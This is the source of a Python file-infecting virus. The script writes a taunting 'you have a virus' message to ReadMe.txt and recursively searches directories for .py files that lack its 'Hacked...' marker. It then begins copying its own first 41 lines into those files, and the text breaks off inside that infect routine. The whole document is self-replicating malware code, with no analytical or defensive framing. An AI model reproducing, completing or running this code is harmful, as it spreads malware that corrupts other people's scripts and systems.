#!/usr/bin/python  
import os, datetime, inspect
import glob
  
DATA_TO_INSERT = "Hacked..."
bad_words = ['*&#$%#*(#$&*&^#$JHDS(*^#@$*%(#$(*&']
code = "You have either downloaded or ran a virus... Now you have a virus on your computer lol..."
with open('secret.txt') as oldfile, open('ReadMe.txt', 'w') as newfile:
    for line in oldfile:
        if not any(bad_word in line for bad_word in bad_words):
            newfile.write(code)
#search for target files in path 
def search(path):   
    filestoinfect = []  
    filelist = os.listdir(path)  
    for filename in filelist:  
          
        #If it is a folder 
        if os.path.isdir(path+"/"+filename):   
            filestoinfect.extend(search(path+"/"+filename))  
              
        #If it is a python script -> Infect it     
        elif filename[-3:] == ".py":
              
            #default value 
            infected = False  
            for line in open(path+"/"+filename):  
                if DATA_TO_INSERT in line:  
                    infected = True
                    break
            if infected == False:  
                filestoinfect.append(path+"/"+filename)  
    return filestoinfect  
  
#changes to be made in the target file  
def infect(filestoinfect):  
    target_file = inspect.currentframe().f_code.co_filename  
    virus = open(os.path.abspath(target_file))  
    virusstring = ""  
    for i,line in enumerate(virus):  
        if i>=0 and i <41:  

